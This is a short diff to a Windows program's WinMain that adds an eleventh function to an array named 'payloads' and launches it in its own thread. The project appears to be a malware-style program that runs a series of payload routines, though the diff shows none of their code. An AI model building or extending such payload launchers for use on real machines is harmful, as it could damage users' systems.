@@ -33,7 +33,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p7,
         p8,
         p9,
-        p10
+        p10,
+        p11
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     DWORD zero = 0;
@@ -160,6 +161,9 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[10], NULL, NULL, NULL);
+
+    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[11], NULL, NULL, NULL);
+
 
     CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[4], NULL, NULL, NULL);
 
